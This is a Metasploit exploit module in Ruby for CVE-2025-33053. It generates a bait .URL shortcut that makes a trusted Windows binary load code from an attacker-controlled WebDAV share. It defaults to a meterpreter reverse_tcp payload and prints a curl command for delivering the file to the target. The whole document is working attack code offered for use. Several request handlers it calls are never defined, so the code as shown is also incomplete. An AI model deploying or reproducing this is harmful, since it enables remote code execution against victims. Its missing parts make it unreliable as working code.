##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2025-33053 Exploit via Malicious .URL File and WebDAV',
        'Description' => %q{
          This module exploits CVE-2025-33053 by generating a malicious .URL file pointing
          to a trusted LOLBAS binary with parameters designed to trigger unintended behavior.
          Optionally, a payload is generated and hosted on a specified WebDAV directory.
          When the victim opens the shortcut, it will attempt to access the WebDAV path,
          potentially resulting in remote code execution via a trusted binary.
        },

        'Author' => [
          'Alexandra Gofman', # vuln research
          'David Driker', # vuln research
          'Dev Bui Hieu' # module dev
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2025-06-11',
        'References' => [
          ['CVE', '2025-33053'],
          ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept']
        ],
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Targets' => [['Windows (generic)', {}]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('URIPATH', [true, 'The URI to use (do not change)', '/']),
        OptString.new('OUTFILE', [true, 'Output URL file name', 'bait.url']),
        OptString.new('PAYLOAD_NAME', [true, 'Output payload file name', 'route.exe']),
        OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/x64/meterpreter/reverse_tcp']),
        OptBool.new('GEN_PAYLOAD', [true, 'Generate payload and move to WebDAV directory', true]),
        OptString.new('WEBDAV_DIR', [true, 'WebDAV directory path', '/var/www/webdav'])
      ], self.class
    )
    register_advanced_options(
      [
        OptString.new('LOLBAS_EXE',
                      [true, 'Path to trusted binary (LOLBAS)', 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe']),
        OptString.new('ICON_PATH',
                      [true, 'Icon file path', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']),
        OptInt.new('ICON_INDEX', [true, 'Icon index in icon file', 13]),
        OptString.new('MODIFIED_HEX', [true, 'Modified timestamp in hex', '20F06BA06D07BD014D'])
      ]
    )
  end

  def on_request_uri(cli, request)
    print_status('Got request')
    case request.method
    when 'OPTIONS'
      print_status('[+] Got OPTIONS request')
      process_options(cli, request)
    when 'PROPFIND'
      print_status('[+] Got PROPFIND request')
      process_propfind(cli, request)
    when 'GET'
      print_status('[+] Got GET request')
      process_get(cli, request)
    else
      process_ignore(cli, request)
    end
  end

  def primer
    webdav = '\\\\'
    if datastore['SSL']
      if datastore['SRVPORT'] != 443
        fail_with(Failure::BadConfig, 'SRVPORT must be 443')
      end
      webdav = "#{datastore['SRVHOST']}@ssl"
    else
      webdav = "#{datastore['SRVHOST']}@#{datastore['SRVPORT']}"
    end
    webdav_unc = %(#{webdav}\\webdav\\)
    print_status("[+] WebDAV running at #{webdav_unc}")
    write_url_file(webdav_unc)
  end

  def write_url_file(webdav_unc)
    content = generate_url_content(webdav_unc)
    outfile = %(#{Rex::Text.rand_text_alphanumeric(8)}.url)
    path = store_local('webdav.url', nil, content, outfile)
    print_status("[+] URL file: #{path}, deliver to target's machine")
    print_status("[+] Run following: curl http://#{datastore['SRVHOST']}:8080/#{outfile} -o #{outfile}")
  end

  def generate_url_content(webdav_unc)
    <<~URLFILE
      [InternetShortcut]
      URL=#{datastore['LOLBAS_EXE']}
      WorkingDirectory=#{webdav_unc}
      ShowCommand=7
      IconIndex=#{datastore['ICON_INDEX']}
      IconFile=#{datastore['ICON_PATH']}
      Modified=#{datastore['MODIFIED_HEX']}
    URLFILE
  end

  def return_error(currentpath)
    fail_with(Failure::NoAccess,
              "Cannot write to #{currentpath}. Permission denied.\n" \
              'Try restarting Metasploit with root privilege.')
  end
end
